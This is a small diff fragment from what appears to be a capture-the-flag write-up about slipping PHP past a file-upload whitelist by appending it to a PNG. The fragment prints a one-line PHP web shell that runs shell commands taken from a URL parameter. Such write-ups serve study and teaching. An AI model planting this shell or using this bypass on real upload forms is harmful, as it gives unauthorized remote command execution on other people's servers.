@@ -170,7 +170,7 @@ if(isset($_POST['submit'])) {
 
 this code shows that only acceptable extension are those in `$whilelist` variable and then it md5 hash the basename (for example test.png) and upload it to `/upload` directory
 
-by inserting the php code in the last line of a png file, the uploader allows the file to be uploaded so i used the following code 
+by inserting the php code in the last line of a png file, the uploader allows the file to be uploaded so i used the following code :
 
 ```php
 <?php system($_GET["cmd"]) ?>
